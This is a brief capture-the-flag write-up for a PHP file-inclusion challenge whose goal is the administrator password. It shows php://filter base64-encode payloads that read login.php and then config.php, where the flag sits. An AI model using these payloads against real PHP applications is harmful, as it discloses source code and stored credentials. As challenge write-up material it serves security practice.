# Description 
```
Statement
Retrieve the administrator password of this application.
```

# Exploit
- The first step is to retrieve the content of ``login.php`` using the ``php://filter wrapper``.
- We use the following payload: ``php://filter/convert.base64-encode/resource=login.php``
```
<?php
include("config.php");
```
- Next, we retrieve the content of config.php, where we find the flag:
``php://filter/convert.base64-encode/resource=config.php``